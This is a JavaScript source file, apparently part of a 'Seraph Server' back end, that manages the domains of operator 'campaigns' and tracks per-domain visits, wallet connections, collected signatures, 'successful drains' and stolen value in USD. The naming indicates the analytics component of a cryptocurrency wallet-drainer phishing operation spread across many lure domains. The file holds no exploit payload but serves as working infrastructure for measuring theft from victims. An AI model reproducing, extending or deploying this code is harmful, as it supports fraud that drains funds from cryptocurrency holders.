/**
 * ============================================================================
 * SERAPH SERVER - Campaign Domains Service
 * ============================================================================
 * 
 * Manages multiple domains per campaign
 * - CRUD operations for campaign domains
 * - Per-domain statistics tracking
 * - Aggregated campaign totals
 * 
 * ============================================================================
 */

import supabase from '../config/supabase.js'

/**
 * Add a domain to a campaign
 */
async function addDomain(campaignId, { domain, label }) {
  // Normalize domain (lowercase, remove protocol)
  const normalizedDomain = normalizeDomain(domain)
  
  if (!normalizedDomain) {
    throw new Error('Invalid domain')
  }
  
  // Check campaign exists
  const { data: campaign, error: campaignError } = await supabase
    .from('campaigns')
    .select('id, operator_id')
    .eq('id', campaignId)
    .single()
  
  if (campaignError || !campaign) {
    throw new Error('Campaign not found')
  }
  
  // Insert domain
  const { data, error } = await supabase
    .from('campaign_domains')
    .insert({
      campaign_id: campaignId,
      domain: normalizedDomain,
      label: label || null,
      is_active: true
    })
    .select()
    .single()
  
  if (error) {
    if (error.code === '23505') { // Unique violation
      throw new Error('Domain already added to this campaign')
    }
    throw new Error(error.message)
  }
  
  return data
}

/**
 * Get all domains for a campaign
 */
async function getDomains(campaignId, { includeInactive = false } = {}) {
  let query = supabase
    .from('campaign_domains')
    .select('*')
    .eq('campaign_id', campaignId)
    .order('created_at', { ascending: true })
  
  if (!includeInactive) {
    query = query.eq('is_active', true)
  }
  
  const { data, error } = await query
  
  if (error) throw new Error(error.message)
  
  return data || []
}

/**
 * Get domain by ID
 */
async function getDomainById(domainId) {
  const { data, error } = await supabase
    .from('campaign_domains')
    .select(`
      *,
      campaign:campaigns(id, name, campaign_key, operator_id)
    `)
    .eq('id', domainId)
    .single()
  
  if (error) throw new Error('Domain not found')
  
  return data
}

/**
 * Get domain by campaign and domain name
 */
async function getDomainByName(campaignId, domain) {
  const normalizedDomain = normalizeDomain(domain)
  
  const { data, error } = await supabase
    .from('campaign_domains')
    .select('*')
    .eq('campaign_id', campaignId)
    .eq('domain', normalizedDomain)
    .single()
  
  if (error) return null
  
  return data
}

/**
 * Find or create domain for a campaign
 * Used by tracking endpoint
 */
async function findOrCreateDomain(campaignId, domain) {
  const normalizedDomain = normalizeDomain(domain)
  
  if (!normalizedDomain) {
    return null
  }
  
  // Try to find existing
  let { data } = await supabase
    .from('campaign_domains')
    .select('*')
    .eq('campaign_id', campaignId)
    .eq('domain', normalizedDomain)
    .single()
  
  if (data) {
    return data
  }
  
  // Create new domain entry
  const { data: newDomain, error } = await supabase
    .from('campaign_domains')
    .insert({
      campaign_id: campaignId,
      domain: normalizedDomain,
      label: null,
      is_active: true
    })
    .select()
    .single()
  
  if (error) {
    // Race condition - try to fetch again
    const { data: existing } = await supabase
      .from('campaign_domains')
      .select('*')
      .eq('campaign_id', campaignId)
      .eq('domain', normalizedDomain)
      .single()
    
    return existing
  }
  
  return newDomain
}

/**
 * Update domain
 */
async function updateDomain(domainId, updates) {
  const allowedFields = ['label', 'is_active']
  
  const filteredUpdates = {}
  for (const key of allowedFields) {
    if (updates[key] !== undefined) {
      filteredUpdates[key] = updates[key]
    }
  }
  
  const { data, error } = await supabase
    .from('campaign_domains')
    .update({
      ...filteredUpdates,
      updated_at: new Date().toISOString()
    })
    .eq('id', domainId)
    .select()
    .single()
  
  if (error) throw new Error(error.message)
  
  return data
}

/**
 * Delete domain
 */
async function deleteDomain(domainId) {
  const { error } = await supabase
    .from('campaign_domains')
    .delete()
    .eq('id', domainId)
  
  if (error) throw new Error(error.message)
}

/**
 * Increment domain stats
 * Called by tracking endpoints
 */
async function incrementStats(domainId, stats) {
  const { 
    visits = 0, 
    uniqueVisitors = 0, 
    connections = 0, 
    signatures = 0, 
    drains = 0, 
    valueUsd = 0 
  } = stats
  
  // Use RPC for atomic increment
  const { data, error } = await supabase.rpc('increment_domain_stats', {
    domain_id: domainId,
    add_visits: visits,
    add_unique: uniqueVisitors,
    add_connections: connections,
    add_signatures: signatures,
    add_drains: drains,
    add_value: valueUsd
  })
  
  // Fallback if RPC doesn't exist - do manual update
  if (error && error.code === '42883') { // Function doesn't exist
    const { data: current } = await supabase
      .from('campaign_domains')
      .select('*')
      .eq('id', domainId)
      .single()
    
    if (!current) return null
    
    const { data: updated } = await supabase
      .from('campaign_domains')
      .update({
        total_visits: (current.total_visits || 0) + visits,
        unique_visitors: (current.unique_visitors || 0) + uniqueVisitors,
        wallet_connections: (current.wallet_connections || 0) + connections,
        signatures_collected: (current.signatures_collected || 0) + signatures,
        successful_drains: (current.successful_drains || 0) + drains,
        total_value_usd: (current.total_value_usd || 0) + valueUsd,
        last_visit_at: new Date().toISOString(),
        updated_at: new Date().toISOString()
      })
      .eq('id', domainId)
      .select()
      .single()
    
    return updated
  }
  
  return data
}

/**
 * Record a visit to a domain
 */
async function recordVisit(campaignId, domain) {
  const domainRecord = await findOrCreateDomain(campaignId, domain)
  
  if (!domainRecord) {
    return null
  }
  
  return incrementStats(domainRecord.id, { visits: 1 })
}

/**
 * Record a wallet connection
 */
async function recordConnection(campaignId, domain) {
  const domainRecord = await findOrCreateDomain(campaignId, domain)
  
  if (!domainRecord) {
    return null
  }
  
  return incrementStats(domainRecord.id, { connections: 1 })
}

/**
 * Record a signature collected
 */
async function recordSignature(campaignId, domain) {
  const domainRecord = await findOrCreateDomain(campaignId, domain)
  
  if (!domainRecord) {
    return null
  }
  
  return incrementStats(domainRecord.id, { signatures: 1 })
}

/**
 * Record a successful drain
 */
async function recordDrain(campaignId, domain, valueUsd = 0) {
  const domainRecord = await findOrCreateDomain(campaignId, domain)
  
  if (!domainRecord) {
    return null
  }
  
  return incrementStats(domainRecord.id, { drains: 1, valueUsd })
}

/**
 * Get campaign stats aggregated from all domains
 */
async function getCampaignStats(campaignId) {
  const { data, error } = await supabase
    .from('campaign_domains')
    .select('*')
    .eq('campaign_id', campaignId)
  
  if (error) throw new Error(error.message)
  
  const domains = data || []
  
  // Aggregate stats
  const totals = domains.reduce((acc, d) => ({
    total_visits: acc.total_visits + (d.total_visits || 0),
    unique_visitors: acc.unique_visitors + (d.unique_visitors || 0),
    wallet_connections: acc.wallet_connections + (d.wallet_connections || 0),
    signatures_collected: acc.signatures_collected + (d.signatures_collected || 0),
    successful_drains: acc.successful_drains + (d.successful_drains || 0),
    total_value_usd: acc.total_value_usd + parseFloat(d.total_value_usd || 0)
  }), {
    total_visits: 0,
    unique_visitors: 0,
    wallet_connections: 0,
    signatures_collected: 0,
    successful_drains: 0,
    total_value_usd: 0
  })
  
  return {
    domains,
    totals,
    domain_count: domains.length
  }
}

/**
 * Normalize domain string
 */
function normalizeDomain(domain) {
  if (!domain) return null
  
  let normalized = domain.toLowerCase().trim()
  
  // Remove protocol
  normalized = normalized.replace(/^https?:\/\//, '')
  
  // Remove www.
  normalized = normalized.replace(/^www\./, '')
  
  // Remove trailing slash and path
  normalized = normalized.split('/')[0]
  
  // Remove port
  normalized = normalized.split(':')[0]
  
  // Basic validation (allow localhost for development)
  if (!normalized || normalized.length < 3) {
    return null
  }
  
  // Allow localhost, otherwise require a dot
  if (normalized !== 'localhost' && !normalized.includes('.')) {
    return null
  }
  
  return normalized
}

export default {
  addDomain,
  getDomains,
  getDomainById,
  getDomainByName,
  findOrCreateDomain,
  updateDomain,
  deleteDomain,
  incrementStats,
  recordVisit,
  recordConnection,
  recordSignature,
  recordDrain,
  getCampaignStats,
  normalizeDomain
}